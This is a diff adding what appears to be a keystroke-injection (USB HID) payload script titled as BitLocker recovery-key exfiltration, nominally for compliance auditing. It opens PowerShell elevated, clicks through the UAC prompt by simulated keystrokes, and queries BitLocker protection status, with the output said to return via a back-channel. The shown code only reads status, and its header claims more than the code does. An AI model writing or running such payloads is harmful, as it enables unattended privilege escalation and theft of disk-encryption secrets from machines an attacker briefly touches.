@@ -1,0 +1,19 @@
+REM ============================================================
+REM  Windows · BitLocker Status + Recovery Key Exfil
+REM ============================================================
+REM  Checks BitLocker encryption status and attempts to export
+REM  recovery keys. For auditing disk encryption compliance.
+REM
+REM  Requires admin. Output returned via back-channel.
+
+DEFAULTDELAY 60
+
+GUI r
+DELAY 700
+STRING powershell
+CTRL SHIFT ENTER
+DELAY 2000
+ALT y
+DELAY 1500
+
+WINHI 10000 manage-bde -status C: | Select-String 'Conversion Status|Encryption Method|Key Protectors|Protection Status'
